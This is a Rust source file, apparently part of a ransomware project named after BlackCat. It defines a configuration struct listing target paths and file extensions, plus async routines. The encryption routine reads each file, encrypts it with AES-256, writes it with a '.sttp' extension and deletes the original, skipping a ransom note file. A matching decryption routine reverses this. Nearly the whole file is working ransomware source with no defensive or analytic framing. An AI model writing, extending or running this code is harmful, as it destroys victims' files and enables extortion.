use crate::crypto::CryptoEngine;
use serde::{Deserialize, Serialize};
use std::error::Error;
use std::fs;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RansomwareConfig {
    pub target_paths: Vec<String>,
    pub file_extensions: Vec<String>,
    pub encryption_algorithm: String,
    pub max_parallelism: usize,
}

pub struct BlackCatRansomware;

impl BlackCatRansomware {
    pub async fn encrypt_all_files(
        files: Vec<String>,
        _config: RansomwareConfig,
        crypto_engine: &CryptoEngine,
    ) -> Result<(), Box<dyn Error>> {
        for file in files {
            if file.contains("README_BLACKCAT.txt") { continue; }

            let content = fs::read(&file)?;
            let encrypted = crypto_engine.encrypt_aes_256(&content)?;
            
            // Добавляем расширение .sttp
            let new_path = format!("{}.sttp", file);
            
            fs::write(&new_path, encrypted)?;
            fs::remove_file(&file)?; 
        }
        Ok(())
    }

    pub async fn decrypt_all_files(
        files: Vec<String>,
        config: RansomwareConfig,
        crypto_engine: &CryptoEngine,
    ) -> Result<(), Box<dyn Error>> {
        let use_chacha20 = config.encryption_algorithm == "chacha20";
        for file in files {
            // Расшифровываем ТОЛЬКО файлы .sttp
            if !file.ends_with(".sttp") { continue; }

            let content = fs::read(&file)?;
            let decrypted = crypto_engine.decrypt_file(&content, use_chacha20)?;
            
            // Убираем расширение .sttp для восстановления оригинала
            let original_path = file.trim_end_matches(".sttp").to_string();
            
            fs::write(&original_path, decrypted)?;
            fs::remove_file(&file)?; 
        }
        Ok(())
    }
}